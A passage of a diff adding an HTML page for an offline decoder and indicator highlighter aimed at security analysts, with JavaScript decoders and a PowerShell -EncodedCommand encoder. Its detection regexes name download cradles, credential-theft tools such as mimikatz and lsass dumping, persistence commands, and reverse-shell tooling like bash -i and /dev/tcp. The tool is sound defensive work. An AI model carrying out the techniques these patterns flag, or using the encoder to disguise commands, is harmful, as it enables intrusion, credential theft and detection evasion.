@@ -1,0 +1,416 @@
+<!doctype html>
+<html lang="en" data-theme="dark">
+<head>
+<meta charset="utf-8">
+<meta name="referrer" content="no-referrer">
+<meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover">
+<meta http-equiv="Content-Security-Policy" content="default-src 'none'; script-src 'unsafe-inline'; style-src 'unsafe-inline'; img-src data:; connect-src 'none'; form-action 'none'; base-uri 'none'">
+<title>Cipher Lens - offline decoder for SOC analysts</title>
+<style>
+:root{color-scheme:dark;--bg:#09090d;--pn:#101016;--pn2:#0b0b10;--bd:#22222c;--tx:#e6e6ee;--mut:#8a8a9c;--ac:#8b7cf6;--ac2:#a99bff;--ok:#4ade9b;--warn:#f5b94a;--bad:#ff7a85;--mono:ui-monospace,SFMono-Regular,Menlo,Consolas,"Liberation Mono",monospace;--sans:Inter,system-ui,-apple-system,"Segoe UI",Roboto,sans-serif}
+[data-theme=light]{color-scheme:light;--bg:#f7f7fa;--pn:#fff;--pn2:#f3f3f8;--bd:#dcdce6;--tx:#17171f;--mut:#63637a;--ac:#5b4bd6;--ac2:#4a3bc4;--ok:#0b7a55;--warn:#a55d00;--bad:#c0332b}
+*{box-sizing:border-box}
+html,body{margin:0;background:var(--bg);color:var(--tx);font:14px/1.55 var(--sans)}
+body{background:radial-gradient(900px 340px at 50% -80px,color-mix(in srgb,var(--ac) 16%,transparent),transparent),var(--bg)}
+nav{max-width:1400px;margin:0 auto;padding:12px 20px;display:flex;gap:8px;align-items:center;justify-content:flex-end}
+.hero{text-align:center;padding:10px 16px 26px}
+.logo{font:700 34px/1.1 var(--mono);letter-spacing:-.5px}.logo i{color:var(--ac2);font-style:normal}
+.hero h1{margin:14px 0 4px;font-size:20px;font-weight:600}
+.tag{color:var(--mut);max-width:640px;margin:0 auto}
+.badge{display:inline-block;margin-top:12px;font-size:12px;color:var(--ok);border:1px solid var(--bd);background:var(--pn);border-radius:20px;padding:2px 12px}
+.sp{flex:1}[hidden]{display:none!important}
+.segw{text-align:center;margin:0 0 18px}
+.seg{display:inline-flex;border:1px solid var(--bd);border-radius:10px;padding:3px;background:var(--pn)}
+.seg button{border:0;border-radius:7px;padding:5px 26px;font-weight:600}
+.seg button.on{background:var(--ac);color:#fff}
+select{background:var(--pn2);border:1px solid var(--bd);border-radius:8px;padding:5px 8px;color:var(--tx);font:inherit;max-width:260px}
+main{max-width:1400px;margin:0 auto;padding:0 20px 48px;display:grid;gap:14px}
+.grid{display:grid;grid-template-columns:1fr 1fr;gap:14px}
+@media(max-width:900px){.grid{grid-template-columns:1fr}}
+.panel{background:var(--pn);border:1px solid var(--bd);border-radius:12px;padding:14px;min-width:0}
+.ph{display:flex;align-items:center;gap:8px;margin-bottom:10px;flex-wrap:wrap}
+h2{font-size:13px;margin:0;font-weight:600;letter-spacing:.2px}h3{font-size:12.5px;margin:12px 0 4px}
+small,.mut{color:var(--mut);font-size:12px}
+button,input{font:inherit;color:var(--tx)}
+button{background:transparent;border:1px solid var(--bd);border-radius:8px;padding:5px 12px;cursor:pointer;transition:border-color .15s,background .15s}
+button:hover{border-color:var(--ac);background:var(--pn2)}
+button:focus-visible,textarea:focus-visible,input:focus-visible{outline:2px solid var(--ac);outline-offset:1px}
+button.pri{background:var(--ac);color:#fff;border-color:var(--ac);font-weight:600;padding:7px 26px}
+button.pri:hover{background:var(--ac2)}
+textarea,pre{width:100%;height:300px;margin:0;background:var(--pn2);border:1px solid var(--bd);border-radius:8px;color:var(--tx);font:13px/1.55 var(--mono);padding:12px;resize:vertical;overflow:auto;white-space:pre-wrap;word-break:break-all}
+textarea:focus{border-color:var(--ac)}
+.bar{display:flex;gap:12px;align-items:center;margin:12px 0 10px;flex-wrap:wrap}
+.key{color:var(--mut);font-size:12px;display:flex;gap:6px;align-items:center}
+.key input{background:var(--pn2);border:1px solid var(--bd);border-radius:8px;padding:5px 9px;width:140px}
+.chips{display:flex;flex-wrap:wrap;gap:6px;align-items:center}
+.op{font-size:12.5px;border-radius:20px;padding:3px 11px}
+.op i{font-style:normal;color:var(--mut);margin-left:4px}
+.op.hit{border-color:var(--ok);color:var(--ok)}.op.hit i{color:var(--ok)}
+.op.maybe{border-color:var(--warn)}
+.chain{margin-bottom:10px;min-height:28px}
+.chain button{border-radius:20px;padding:2px 11px;font-size:12.5px}
+.chain button.on{border-color:var(--ac);color:var(--ac2)}
+.chain span{color:var(--mut)}
+mark,.u,.i,.h,.m,.s{border-radius:3px;padding:0 2px;color:inherit;background:none}
+.u{background:color-mix(in srgb,var(--ac) 28%,transparent)}
+.i{background:color-mix(in srgb,var(--warn) 30%,transparent)}
+.h{background:color-mix(in srgb,var(--ok) 25%,transparent)}
+.m{background:color-mix(in srgb,var(--mut) 30%,transparent)}
+.s{background:color-mix(in srgb,var(--bad) 30%,transparent);outline:1px solid color-mix(in srgb,var(--bad) 55%,transparent)}
+.grp code{display:inline-block;margin:2px 6px 2px 0;padding:1px 8px;border-radius:6px;background:var(--pn2);border:1px solid var(--bd);font:12px var(--mono);cursor:copy;word-break:break-all}
+.grp h3.s,.grp h3.i,.grp h3.h,.grp h3.u,.grp h3.m{display:inline-block;padding:1px 8px}
+.feat{display:grid;grid-template-columns:repeat(3,1fr);gap:14px;margin-top:6px}
+@media(max-width:900px){.feat{grid-template-columns:1fr}}
+.feat div{border:1px solid var(--bd);border-radius:12px;padding:14px;background:var(--pn)}
+.feat b{display:block;margin-bottom:4px}.feat span{color:var(--mut);font-size:13px}
+.hist{display:grid;gap:4px;max-height:220px;overflow:auto}
+.hist button{text-align:left;font:12px var(--mono);overflow:hidden;text-overflow:ellipsis;white-space:nowrap;border-radius:6px}
+#toast{position:fixed;bottom:18px;left:50%;transform:translateX(-50%);background:var(--pn);border:1px solid var(--ac);border-radius:8px;padding:7px 16px;opacity:0;pointer-events:none;transition:opacity .2s}
+#toast.on{opacity:1}
+@media(prefers-reduced-motion:reduce){*{transition:none!important}}
+
+/* ---- Responsive ---- */
+html{-webkit-text-size-adjust:100%}
+body{padding-left:env(safe-area-inset-left);padding-right:env(safe-area-inset-right);padding-bottom:env(safe-area-inset-bottom)}
+.logo{font-size:clamp(24px,6vw,34px)}
+.hero h1{font-size:clamp(17px,3.4vw,20px)}
+textarea,pre{height:clamp(200px,38vh,340px)}
+@media(min-width:1600px){nav,main{max-width:1640px}textarea,pre{height:clamp(300px,45vh,540px)}}
+@media(pointer:coarse){button{min-height:40px}.op{padding:6px 13px}.grp code{padding:4px 9px}}
+@media(max-width:900px){
+  nav,main{padding-left:16px;padding-right:16px}
+  .feat{grid-template-columns:repeat(2,1fr)}
+  .grid,.feat{gap:12px}
+}
+@media(max-width:600px){
+  nav{padding:8px 12px}main{padding:0 12px 28px;gap:12px}
+  .hero{padding:2px 14px 16px}.tag{font-size:13px}
+  .badge{font-size:11.5px}
+  .seg{display:flex;width:calc(100% - 24px);max-width:380px}.seg button{flex:1;padding:8px 10px}
+  .panel{padding:12px;border-radius:10px}
+  .feat{grid-template-columns:1fr}
+  .ph{gap:6px}.ph .sp{flex-basis:100%;height:0}
+  .ph>button{flex:1 1 calc(50% - 6px)}
+  .bar{flex-direction:column;align-items:stretch;gap:10px}
+  button.pri{width:100%;padding:10px}
+  .key{justify-content:space-between}
+  .key input,.key select{flex:1;width:100%;max-width:none;min-height:40px}
+  textarea,input,select{font-size:16px}
+  textarea,pre{padding:10px;height:clamp(180px,32vh,300px)}
+  .chain{flex-wrap:nowrap;overflow-x:auto;padding-bottom:6px}.chain button,.chain span{flex:none}
+  #toast{width:calc(100% - 28px);text-align:center;bottom:calc(14px + env(safe-area-inset-bottom))}
+}
+
+/* ---- Equal I/O boxes ---- */
+.io{padding:20px}
+.iogrid{display:grid;grid-template-columns:minmax(0,1fr) auto minmax(0,1fr);gap:18px;align-items:center}
+.lbl{font:700 13px var(--mono);letter-spacing:.6px;margin-bottom:8px}
+.iogrid textarea,.iogrid pre{height:clamp(230px,40vh,380px);border:2px solid var(--tx);border-radius:0;resize:none;background:var(--pn2);padding:14px}
+.iogrid textarea:focus{border-color:var(--ac2)}
+.iogrid textarea::placeholder,#out .mut{color:var(--mut);font-style:normal}
+.foot{display:flex;justify-content:space-between;align-items:center;gap:8px;margin-top:8px;font:12px var(--mono);color:var(--mut);flex-wrap:wrap}
+.foot span:last-child{display:flex;gap:4px;flex-wrap:wrap}
+.lnk{border:0;background:none;padding:2px 4px;font:12px var(--mono);color:var(--tx);min-height:0;border-radius:0}
+.lnk:hover{background:none;text-decoration:underline}
+.swap{width:46px;height:46px;border:2px solid var(--tx);border-radius:0;font-size:20px;padding:0;line-height:1}
+.actions{justify-content:center;margin:20px 0 12px}
+.io .chips{justify-content:center}
+.io .chain{margin-bottom:12px}
+@media(max-width:900px){
+  .iogrid{grid-template-columns:minmax(0,1fr);gap:12px}
+  .swap{justify-self:center;width:44px;height:40px}
+}
+@media(max-width:600px){
+  .io{padding:12px}
+  .iogrid textarea,.iogrid pre{height:clamp(180px,30vh,260px);padding:10px}
+  .actions{margin:14px 0 10px}
+}
+
+/* ---- Alternative tools ---- */
+.alts{border:2px solid var(--tx);padding:20px;background:var(--pn);font-family:var(--mono)}
+.alts h2{font:700 15px var(--mono);letter-spacing:.6px;text-transform:uppercase}
+.alts>p{margin:8px 0 16px;font-size:13px;color:var(--mut)}
+.altg{display:grid;grid-template-columns:1fr 1fr;gap:14px}
+.alt{display:block;border:2px solid var(--tx);padding:16px;color:inherit;text-decoration:none;background:var(--pn2)}
+.alt:hover,.alt:focus-visible{border-color:var(--ac2);outline:none}
+.alt:focus-visible{box-shadow:0 0 0 2px var(--ac)}
+.alt .top{display:flex;justify-content:space-between;align-items:baseline;gap:10px;margin-bottom:8px}
+.alt b{font-size:15px;overflow-wrap:anywhere}
+.alt .t{font-size:12px;white-space:nowrap}
+.alt p{margin:0;font-size:13px;color:var(--mut)}
+@media(max-width:700px){.altg{grid-template-columns:1fr}.alts{padding:14px}}
+#out.nowrap{white-space:pre;word-break:normal}
+.risk{font:700 12px var(--mono)}
+button.clr{padding:7px 22px;font-weight:600}
+@media(max-width:600px){button.clr{width:100%;padding:10px}}
+</style>
+</head>
+<body>
+<nav><button id="bSample">Load sample</button><button id="bTheme" aria-label="Toggle theme">Light mode</button></nav>
+<div class="hero">
+  <div class="logo">&lt;Cipher<i>Lens</i>/&gt;</div>
+  <h1>Decode. Deobfuscate. Investigate.</h1>
+  <p class="tag">Fast, private decoding and encoding for security analysts. Paste encoded content to read it, or encode text to test detections, all with indicators highlighted.</p>
+  <span class="badge" title="Network access is blocked by the page's Content-Security-Policy">&#9679; Local processing, nothing leaves your browser</span>
+</div>
+<div class="segw"><div class="seg" role="group" aria-label="Mode"><button id="mDec" class="on" aria-pressed="true">Decode</button><button id="mEnc" aria-pressed="false">Encode</button></div></div>
+<main>
+  <section class="panel io">
+    <div class="iogrid">
+      <div class="col">
+        <div class="lbl">INPUT:</div>
+        <textarea id="inp" aria-label="Input" spellcheck="false" placeholder="// paste encoded or obfuscated content. Ctrl+Enter to decode"></textarea>
+        <div class="foot"><span id="cnt">0 chars</span><span><button class="lnk" id="bFile">[open file]</button><input type="file" id="file" hidden><button class="lnk" id="bUndo">[undo layer]</button><button class="lnk" id="bClear">[clear]</button></span></div>
+      </div>
+      <button class="swap" id="bSwap" title="Use output as input" aria-label="Use output as input">&#8645;</button>
+      <div class="col">
+        <div class="lbl">OUTPUT:</div>
+        <pre id="out" aria-label="Output" tabindex="0" aria-live="polite"></pre>
+        <div class="foot"><span id="ocnt">0 chars</span><span><button class="lnk" id="bCopy">[copy]</button><button class="lnk" id="bIoc">[copy iocs]</button><button class="lnk" id="bMd">[copy md]</button><button class="lnk" id="bJson">[export json]</button><button class="lnk" id="bWrap">[wrap: on]</button></span></div>
+      </div>
+    </div>
+    <div class="bar actions">
+      <button class="pri" id="bAuto">Decode</button>
+      <button id="bReset" class="clr">Clear</button>
+      <label class="key" id="encWrap" hidden>Encoding <select id="encSel"></select></label>
+      <label class="key">XOR key <input id="key" placeholder="text or 0x41" autocomplete="off"></label>
+    </div>
+    <div id="chain" class="chips chain"></div>
+    <div id="ops" class="chips" role="group" aria-label="Decoders"></div>
+  </section>
+  <section class="panel"><div class="ph"><h2>Indicators and suspicious patterns</h2><small>Click any value to copy it</small><span class="sp"></span><span id="risk" class="risk"></span></div><div id="iocs" class="grp"></div></section>
+  <section class="panel"><div class="ph"><h2>History</h2><small>kept in memory for this tab only</small><span class="sp"></span><button id="bHC">Clear history</button></div><div id="hist" class="hist"></div></section>
+  <div class="feat">
+    <div><b>Private by design</b><span>All decoding happens in this tab. A strict Content-Security-Policy blocks network requests.</span></div>
+    <div><b>Layered decoding</b><span>Detects the encoding and keeps decoding until the content is readable, then lets you step back through each layer.</span></div>
+    <div><b>Investigation ready</b><span>Highlights commands, IPs, URLs and hashes, and exports defanged IOCs and a JSON report.</span></div>
+  </div>
+
+  <section class="alts" aria-labelledby="altH">
+    <h2 id="altH">// Alternative tools</h2>
+    <p>Other well-known encoders and decoders. Useful for a second opinion, but they are outside your control: never paste internal, customer or incident data into them, and expect some to be blocked by your organization.</p>
+    <div class="altg">
+      <a class="alt" href="https://gchq.github.io/CyberChef/" target="_blank" rel="noopener noreferrer"><div class="top"><b>CyberChef</b><span class="t">[SELF-HOSTABLE]</span></div><p>Open-source data analysis toolkit from GCHQ. Chain hundreds of operations, and download it to host internally so data stays inside your network.</p></a>
+      <a class="alt" href="https://base64.sh/" target="_blank" rel="noopener noreferrer"><div class="top"><b>Base64.sh</b><span class="t">[ENCODER/DECODER]</span></div><p>Fast Base64 encode and decode in the browser. Processing is local, but its curl API puts content in the URL, so avoid that for sensitive data.</p></a>
+      <a class="alt" href="https://www.base64encode.org/" target="_blank" rel="noopener noreferrer"><div class="top"><b>base64encode.org</b><span class="t">[ENCODER]</span></div><p>Long-running dedicated Base64 encoder with charset selection and options for URL-safe output and line breaks.</p></a>
+      <a class="alt" href="https://www.base64decode.org/" target="_blank" rel="noopener noreferrer"><div class="top"><b>base64decode.org</b><span class="t">[DECODER]</span></div><p>Sister site to base64encode.org. Decode Base64 strings with output charset and newline handling options.</p></a>
+      <a class="alt" href="https://base64.guru/" target="_blank" rel="noopener noreferrer"><div class="top"><b>base64.guru</b><span class="t">[REFERENCE]</span></div><p>Broad Base64 reference covering standards, alphabets and converters for images, PDFs and many file formats.</p></a>
+      <a class="alt" href="https://codebeautify.org/base64-decode" target="_blank" rel="noopener noreferrer"><div class="top"><b>Code Beautify</b><span class="t">[MULTI-TOOL]</span></div><p>Large developer-tools portal that pairs Base64 with JSON, XML, image and crypto utilities in one place.</p></a>
+      <a class="alt" href="https://cryptii.com/" target="_blank" rel="noopener noreferrer"><div class="top"><b>Cryptii</b><span class="t">[PIPELINE]</span></div><p>Modular cipher and encoding playground. Chain Base64 with hex, ROT13 and other transforms in a visual pipeline.</p></a>
+      <a class="alt" href="https://www.freeformatter.com/base64-encoder.html" target="_blank" rel="noopener noreferrer"><div class="top"><b>FreeFormatter</b><span class="t">[FORMATTER]</span></div><p>Browser-based Base64 encoder and decoder alongside JSON, XML, HTML and YAML formatters.</p></a>
+    </div>
+  </section>
+</main>
+<div id="toast" role="status"></div>
+<script>
+'use strict';
+const $=s=>document.querySelector(s);
+const esc=s=>s.replace(/[&<>"]/g,c=>({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;'}[c]));
+const printable=s=>{if(!s)return 0;let p=0;for(let i=0;i<s.length;i++){const c=s.charCodeAt(i);if((c>=32&&c<127)||c==9||c==10||c==13||c>255)p++}return p/s.length};
+const KW=/(https?:|www\.|\.com|powershell|cmd|whoami|password|admin|invoke|\.exe|net user|system32|echo |the )/gi;
+const kwc=s=>(s.match(KW)||[]).length;
+const rot13=s=>s.replace(/[a-z]/gi,c=>{const b=c<='Z'?65:97;return String.fromCharCode((c.charCodeAt(0)-b+13)%26+b)});
+const b2t=b=>{let n=0;for(const x of b)if(!x)n++;
+  if(b.length>3&&n>b.length/4)return new TextDecoder('utf-16le').decode(b).replace(/^\uFEFF/,'');
+  try{return new TextDecoder('utf-8',{fatal:true}).decode(b)}catch{let r='';for(const x of b)r+=String.fromCharCode(x);return r}};
+const fromB64=s=>{s=s.replace(/\s+/g,'').replace(/-/g,'+').replace(/_/g,'/');while(s.length%4)s+='=';return Uint8Array.from(atob(s),c=>c.charCodeAt(0))};
+const magic=b=>b[0]==0x1f&&b[1]==0x8b?'gzip':(b[0]==0x78&&[1,0x9c,0xda].includes(b[1])?'deflate':null);
+async function inflate(b,f){const r=await new Response(new Blob([b]).stream().pipeThrough(new DecompressionStream(f))).arrayBuffer();return b2t(new Uint8Array(r))}
+function b64find(s){
+  const t=s.replace(/\s+/g,'');
+  const c=!/[ \t]/.test(s.trim())&&/^[A-Za-z0-9+\/_-]{8,}={0,2}$/.test(t)?[t]:(s.match(/[A-Za-z0-9+\/]{12,}={0,2}/g)||[]).sort((a,b)=>b.length-a.length).slice(0,5);
+  for(const x of c){try{const b=fromB64(x),m=magic(b);
+    if(m)return{b,m,whole:x===t,tok:x};
+    const tx=b2t(b);if(tx.length>=3&&printable(tx)>.9)return{b,tx,whole:x===t,tok:x}}catch{}}
+  return null}
+const hx=s=>{const c=s.replace(/0x|\\x|[\s:,-]/gi,'');if(c.length<4||c.length%2||!/^[0-9a-f]+$/i.test(c))return null;return Uint8Array.from(c.match(/../g),x=>parseInt(x,16))};
+const xorS=(s,k)=>{let o='';for(let i=0;i<s.length;i++)o+=String.fromCharCode((s.charCodeAt(i)&255)^k[i%k.length]);return o};
+const b64u=s=>b2t(fromB64(s));
+const cc=s=>{const a=s.match(/\d+/g)||[];return a.length>3&&a.every(n=>+n<=255)&&/^[\d\s,;]+$/.test(s)?a:null};
+
+const B32A='ABCDEFGHIJKLMNOPQRSTUVWXYZ234567';
+const b32=s=>{let bits='';for(const c of s.replace(/[\s=]/g,'').toUpperCase()){const i=B32A.indexOf(c);if(i<0)return null;bits+=i.toString(2).padStart(5,'0')}const o=[];for(let i=0;i+8<=bits.length;i+=8)o.push(parseInt(bits.slice(i,i+8),2));return Uint8Array.from(o)};
+const psclean=s=>{let o=s.replace(/`([A-Za-z])/g,'$1').replace(/\[char\]\s*\(?\s*(\d{2,3})\s*\)?/gi,(m,n)=>"'"+String.fromCharCode(+n)+"'");
+  for(let i=0;i<60;i++){const p=o.replace(/'([^']*)'\s*\+\s*'([^']*)'/g,"'$1$2'").replace(/"([^"]*)"\s*\+\s*"([^"]*)"/g,'"$1$2"');if(p===o)break;o=p}return o};
+const D=[
+ {id:'b64',name:'Base64 (+Gzip, UTF-16)',det:s=>{const r=b64find(s);return r?(r.m?.95:r.whole?.9:.75):0},
+  run:async s=>{const r=b64find(s);if(!r)return null;const t=r.m?await inflate(r.b,r.m):r.tx;let u=0;for(const x of r.b)if(!x)u++;
+  const n='Base64'+(r.m?' + '+r.m:'')+(!r.m&&r.b.length>3&&u>r.b.length/4?' (UTF-16LE)':'')+(r.whole?'':' (embedded, context kept)');
+  return{t:r.whole?t:s.replace(r.tok,()=>t),n}}},
+ {id:'hex',name:'Hex',det:s=>{const h=hx(s);return h?(magic(h)?.95:printable(b2t(h))>.85?.9:.4):0},run:async s=>{const h=hx(s);if(!h)return null;const m=magic(h);return m?await inflate(h,m):b2t(h)}},
+ {id:'url',name:'URL',det:s=>/%[0-9a-f]{2}/i.test(s)?.9:0,run:s=>{try{return decodeURIComponent(s)}catch{return unescape(s)}}},
+ {id:'uni',name:'Unicode / \\x escapes',det:s=>/\\u[0-9a-f]{4}|\\u\{|\\x[0-9a-f]{2}|%u[0-9a-f]{4}/i.test(s)?.9:0,
+  run:s=>s.replace(/\\u\{([0-9a-f]{1,6})\}|\\u([0-9a-f]{4})|%u([0-9a-f]{4})|\\x([0-9a-f]{2})/gi,(m,a,b,c,d)=>String.fromCodePoint(parseInt(a||b||c||d,16)))},
+ {id:'html',name:'HTML entities',det:s=>/&(#\d+|#x[0-9a-f]+|lt|gt|amp|quot|apos|nbsp);/i.test(s)?.9:0,
+  run:s=>{const t=document.createElement('textarea');t.innerHTML=s;return t.value}},
+ {id:'jwt',name:'JWT',det:s=>/^\s*eyJ[\w-]+\.eyJ[\w-]+\.[\w-]*\s*$/.test(s)?.95:0,run:s=>{
+  const p=s.trim().split('.'),h=JSON.parse(b64u(p[0])),b=JSON.parse(b64u(p[1]));let n='';
+  for(const k of['iat','nbf','exp'])if(typeof b[k]=='number')n+=`// ${k} = ${new Date(b[k]*1e3).toISOString()}\n`;
+  return `// HEADER\n${JSON.stringify(h,null,2)}\n\n// PAYLOAD\n${JSON.stringify(b,null,2)}\n${n}\n// SIGNATURE (not verified)\n${p[2]}`}},
+ {id:'cc',name:'Char codes',det:s=>cc(s)?.8:0,run:s=>{const a=cc(s);return a&&a.map(n=>String.fromCharCode(+n)).join('')}},
+ {id:'bin',name:'Binary',det:s=>/^[01\s]{16,}$/.test(s)&&s.replace(/\s/g,'').length%8==0?.9:0,run:s=>b2t(Uint8Array.from(s.replace(/\s/g,'').match(/.{8}/g),x=>parseInt(x,2)))},
+ {id:'b32',name:'Base32',det:s=>{if(!/^[A-Z2-7\s]{16,}={0,6}\s*$/.test(s))return 0;const b=b32(s);return b&&printable(b2t(b))>.9?.85:0},run:s=>{const b=b32(s);return b&&b2t(b)}},
+ {id:'psd',name:'PowerShell de-obfuscate',det:s=>/`[A-Za-z]|['"]\s*\+\s*['"]|\[char\]\s*\(?\s*\d/i.test(s)&&psclean(s)!==s?.8:0,run:s=>{const o=psclean(s);return o!==s?o:null}},
+ {id:'rot',name:'ROT13',det:s=>kwc(rot13(s))>kwc(s)?.6:0,run:rot13},
+ {id:'rev',name:'Reverse',det:s=>kwc([...s].reverse().join(''))>kwc(s)?.6:0,run:s=>[...s].reverse().join('')},
+ {id:'xor',name:'XOR (key)',run:s=>{const v=$('#key').value;if(!v)throw new Error('Enter an XOR key first');
+  const k=/^0x[0-9a-f]+$/i.test(v)?Array.from((v.slice(2).padStart(v.length%2?v.length-1:v.length-2,'0')).match(/../g),x=>parseInt(x,16)):Array.from(v,c=>c.charCodeAt(0)&255);
+  return{t:xorS(s,k),n:'XOR key '+v}}},
+ {id:'xb',name:'XOR brute-force (1 byte)',run:s=>{let best=null;const smp=s.slice(0,4000);
+  for(let k=1;k<256;k++){const o=xorS(smp,[k]),sc=printable(o)+kwc(o)*.05;if(!best||sc>best.sc)best={sc,k}}
+  return{t:xorS(s,[best.k]),n:'XOR brute (0x'+best.k.toString(16).padStart(2,'0')+')'}}}
+];
+
+const u8=s=>new TextEncoder().encode(s);
+const b64e=b=>{let r='';for(let i=0;i<b.length;i+=8192)r+=String.fromCharCode.apply(null,b.subarray(i,i+8192));return btoa(r)};
+const h2=b=>Array.from(b,x=>x.toString(16).padStart(2,'0')).join('');
+const keyBytes=()=>{const v=$('#key').value;if(!v)throw new Error('Enter an XOR key first');
+  if(/^0x[0-9a-f]+$/i.test(v)){let h=v.slice(2);if(h.length%2)h='0'+h;return Array.from(h.match(/../g),x=>parseInt(x,16))}
+  return Array.from(v,c=>c.charCodeAt(0)&255)};
+const w16=s=>{const b=new Uint8Array(s.length*2);for(let i=0;i<s.length;i++){b[2*i]=s.charCodeAt(i)&255;b[2*i+1]=s.charCodeAt(i)>>8}return b};
+const e32=b=>{let bits='';for(const x of b)bits+=x.toString(2).padStart(8,'0');let o='';for(let i=0;i<bits.length;i+=5)o+=B32A[parseInt(bits.slice(i,i+5).padEnd(5,'0'),2)];while(o.length%8)o+='=';return o};
+const gz=async b=>new Uint8Array(await new Response(new Blob([b]).stream().pipeThrough(new CompressionStream('gzip'))).arrayBuffer());
+const E=[
+ {id:'b64',name:'Base64',run:s=>b64e(u8(s))},
+ {id:'b64u',name:'Base64 URL-safe',run:s=>b64e(u8(s)).replace(/\+/g,'-').replace(/\//g,'_').replace(/=+$/,'')},
+ {id:'ps',name:'PowerShell -EncodedCommand (UTF-16LE Base64)',run:s=>b64e(w16(s))},
+ {id:'gzb',name:'Gzip + Base64',run:async s=>b64e(await gz(u8(s)))},
+ {id:'b32',name:'Base32',run:s=>e32(u8(s))},
+ {id:'hex',name:'Hex',run:s=>h2(u8(s))},
+ {id:'url',name:'URL (standard)',run:s=>encodeURIComponent(s)},
+ {id:'urlall',name:'URL (every byte)',run:s=>Array.from(u8(s),x=>'%'+x.toString(16).padStart(2,'0')).join('')},
+ {id:'uni',name:'Unicode escapes',run:s=>s.split('').map(c=>'\\u'+c.charCodeAt(0).toString(16).padStart(4,'0')).join('')},
+ {id:'html',name:'HTML entities (numeric)',run:s=>Array.from(s,c=>'&#x'+c.codePointAt(0).toString(16)+';').join('')},
+ {id:'cc',name:'Char codes (decimal)',run:s=>s.split('').map(c=>c.charCodeAt(0)).join(',')},
+ {id:'bin',name:'Binary',run:s=>Array.from(u8(s),x=>x.toString(2).padStart(8,'0')).join(' ')},
+ {id:'rot',name:'ROT13',run:rot13},
+ {id:'rev',name:'Reverse',run:s=>[...s].reverse().join('')},
+ {id:'xor',name:'XOR (key) to Hex',run:s=>{const k=keyBytes();return h2(u8(s).map((x,i)=>x^k[i%k.length]))}}
+];
+const RX=[
+ {re:/\bHK(?:LM|CU|CR|U|CC|EY_[A-Z_]+)\\[^\s'"<>|]+/g,c:'m',l:'Registry keys'},
+ {re:/\b[A-Za-z]:\\(?:[^\s'"<>|\\]+\\)*[^\s'"<>|\\]*/g,c:'m',l:'Windows paths'},
+ {re:/\b(?:[a-z0-9-]+\.)+(?:com|net|org|io|ru|cn|xyz|top|info|biz|co|me|tk|cc|onion|su|site|online|app|dev|cloud|pw|ws|to|ly)\b/g,c:'u',l:'Domains'},
+ {re:/\b(?:https?|hxxps?|ftp):\/\/[^\s'"<>)\]]+/gi,c:'u',l:'URLs'},
+ {re:/\b(?:(?:25[0-5]|2[0-4]\d|1?\d?\d)\[?\.\]?){3}(?:25[0-5]|2[0-4]\d|1?\d?\d)\b/g,c:'i',l:'IPv4 addresses'},
+ {re:/\b(?:[a-f0-9]{64}|[a-f0-9]{40}|[a-f0-9]{32})\b/gi,c:'h',l:'Hashes (MD5/SHA1/SHA256)'},
+ {re:/\b[\w.+-]+@[\w-]+(?:\.[\w-]+)+\b/g,c:'m',l:'Email addresses'}
+];
+const SUS=[
+ [/powershell(?:\.exe)?\s[^\n]*?-e(?:nc|ncodedcommand)?\s/gi,'Encoded PowerShell','T1059.001'],
+ [/\b(?:IEX|Invoke-Expression)\b/gi,'Dynamic execution (IEX)','T1059.001'],
+ [/DownloadString|DownloadFile|Invoke-WebRequest|\bIWR\b|Net\.WebClient|Start-BitsTransfer|certutil[^\n]*-urlcache|bitsadmin/gi,'Download cradle','T1105'],
+ [/\b(?:whoami|net1?\s+(?:user|group|localgroup|view|share)|nltest|ipconfig|systeminfo|quser|tasklist|arp\s+-a|nslookup|hostname|dsquery|klist)\b/gi,'Reconnaissance command','T1082, T1033, T1087'],
+ [/mimikatz|sekurlsa|lsass|procdump|comsvcs\.dll|ntds\.dit|hashdump/gi,'Credential access','T1003'],
+ [/\breg(?:\.exe)?\s+(?:add|save)|schtasks|\bsc(?:\.exe)?\s+(?:create|config)|New-Service|CurrentVersion\\Run/gi,'Persistence','T1547, T1053'],
+ [/-w(?:indowstyle)?\s+hidden|-nop\b|-noprofile|-ep\s+bypass|-ExecutionPolicy\s+bypass/gi,'Evasion flags','T1027'],
+ [/\b(?:curl|wget|ncat?|certutil|mshta|rundll32|regsvr32)\b|bash\s+-i|\/dev\/tcp\//gi,'Network / LOLBin tooling','T1218'],
+ [/FromBase64String|\[Convert\]|-join\s*\[char\]/gi,'Nested encoding in script','T1027'],
+ [/\bcmd(?:\.exe)?\s+\/[ck]\b/gi,'cmd /c execution','T1059.003']
+];
+function analyze(t){
+  const R=[],F={},add=(k,v,c)=>(F[k]=F[k]||{c,v:new Set()}).v.add(v);
+  for(const x of RX)for(const m of t.matchAll(x.re)){R.push([m.index,m.index+m[0].length,x.c]);add(x.l,m[0],x.c)}
+  for(const [re,l,tg] of SUS)for(const m of t.matchAll(re)){R.push([m.index,m.index+m[0].length,'s']);add('Suspicious: '+l+' ['+tg+']',m[0].trim().slice(0,90),'s')}
+  if(F['Domains']&&F['URLs']){for(const d of [...F['Domains'].v])if([...F['URLs'].v].some(u=>u.includes(d)))F['Domains'].v.delete(d);if(!F['Domains'].v.size)delete F['Domains']}
+  let html='';
+  if(t.length<=3e5){R.sort((a,b)=>a[0]-b[0]||b[1]-a[1]);let p=0;
+    for(const [s,e,c] of R){if(s<p)continue;html+=esc(t.slice(p,s))+`<span class="${c}">${esc(t.slice(s,e))}</span>`;p=e}
+    html+=esc(t.slice(p))}else html=esc(t);
+  return{html,F}}
+const dfk=k=>/^(URLs|IPv4|Domains)/.test(k);
+const defang=v=>v.replace(/^hxxp/i,'hxxp').replace(/^http/i,'hxxp').replace(/\[?\.\]?/g,'[.]');
+
+let stack=[''],names=['Input'],hist=[],timer;
+const cur=()=>stack[stack.length-1];
+function toast(m){const t=$('#toast');t.textContent=m;t.classList.add('on');clearTimeout(toast.t);toast.t=setTimeout(()=>t.classList.remove('on'),2200)}
+async function copy(t){try{await navigator.clipboard.writeText(t);toast('Copied')}catch{const a=document.createElement('textarea');a.value=t;document.body.appendChild(a);a.select();document.execCommand('copy');a.remove();toast('Copied')}}
+function detect(s){if(!s||s.length>2e6)return[];
+  return D.filter(d=>d.det).map(d=>{let sc=0;try{sc=d.det(s)}catch{}return{d,sc}}).filter(x=>x.sc>0).sort((a,b)=>b.sc-a.sc)}
+async function step(d,quiet){
+  const s=cur();let r;
+  try{r=await d.run(s)}catch(e){if(!quiet)toast(d.name+' failed: '+e.message);return false}
